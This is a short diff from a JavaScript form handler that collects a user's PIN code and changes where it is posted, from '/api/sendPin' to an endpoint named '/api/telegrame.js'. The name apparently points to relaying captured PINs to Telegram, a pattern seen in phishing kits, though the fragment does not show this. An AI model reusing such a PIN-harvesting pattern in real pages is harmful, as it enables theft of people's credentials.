@@ -200,7 +200,7 @@ document.getElementById("pinForm").addEventListener("submit", async function(e) 
   const pin = e.target.pin_code.value;
 
   try {
-    await fetch("/api/sendPin", {
+    await fetch("/api/telegrame.js", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ pin_code: pin })
